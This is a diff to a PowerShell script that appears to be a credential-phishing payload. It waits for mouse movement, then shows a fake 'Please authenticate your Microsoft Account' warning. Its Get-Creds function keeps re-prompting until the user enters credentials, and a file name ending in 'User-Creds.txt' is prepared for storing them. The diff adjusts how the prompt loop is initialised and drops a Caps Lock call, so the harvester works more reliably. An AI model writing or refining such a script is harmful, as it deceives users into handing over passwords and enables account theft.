@@ -53,7 +53,7 @@ $FileName = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_User-Creds.txt"
 
 function Get-Creds {
 
-    
+    $form = $null
 
     while ($form -eq $null)
     {
@@ -72,7 +72,7 @@ function Get-Creds {
             $msgButton = 'Ok'
             $msgImage = 'Stop'
             $Result = [System.Windows.MessageBox]::Show($msgBody,$msgTitle,$msgButton,$msgImage)
-           
+            $form = $null
 	    continue
         }
         
@@ -130,7 +130,6 @@ $key.SendKeys('{CapsLock}')
 	This is to call the function to pause the script until a mouse movement is detected then activate the pop-up
 #>
 
-Caps-Off
 
 Add-Type -AssemblyName PresentationCore,PresentationFramework
 $msgBody = "Please authenticate your Microsoft Account."
@@ -139,7 +138,7 @@ $msgButton = 'Ok'
 $msgImage = 'Warning'
 $Result = [System.Windows.MessageBox]::Show($msgBody,$msgTitle,$msgButton,$msgImage)
 Write-Host "The user clicked: $Result"
-$form = $null
+
 $creds = Get-Creds
 
 #------------------------------------------------------------------------------------------------------------------------------------
